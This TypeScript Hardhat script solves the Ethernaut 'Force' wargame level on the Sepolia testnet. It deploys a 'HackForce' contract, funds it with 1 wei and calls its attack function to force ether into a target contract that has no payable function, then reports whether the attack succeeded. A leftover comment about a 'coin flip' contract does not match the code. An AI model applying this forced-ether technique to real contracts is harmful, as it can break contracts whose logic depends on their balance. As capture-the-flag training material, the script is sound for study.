import { ethers, network } from "hardhat";
import * as dotenv from 'dotenv';
import { Contract } from "ethers";

dotenv.config();

async function main() {
    // We only verify on Sepolia!
    if (network.config.chainId != 11155111) {
        console.log("Ethernaut contracts in this repo can only be run on the Sepolia Network");

    } else {

        const contractAddress: string = process.env.CONTRACT_INSTANCE_ADDRESS ? process.env.CONTRACT_INSTANCE_ADDRESS : ethers.constants.AddressZero;
        const contract: Contract = await ethers.getContractAt('Force', contractAddress);

        console.log("Contract Instance Loaded");

        // Deploy the hack coin flip contract with a guess goal of 10
        const exploitFactory = await ethers.getContractFactory("HackForce");
        const exploitForceContract = await exploitFactory.deploy(contractAddress);

        // Donate 1 wei to the contract and then attack it
        const transactionReceipt = await exploitForceContract.donate({ value: 1 });

        await transactionReceipt.wait(5);

        console.log("Contract Balance: ", await exploitForceContract.provider.getBalance(exploitForceContract.address));
        const attackReceipt = await exploitForceContract.attack();

        await attackReceipt.wait(5);

        console.log("Orignal Contract Balance: ", await contract.provider.getBalance(contract.address));

        ((await contract.provider.getBalance(contract.address)).isZero()) ? console.log("Attacked Failed") : console.log("Attack Successful");
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })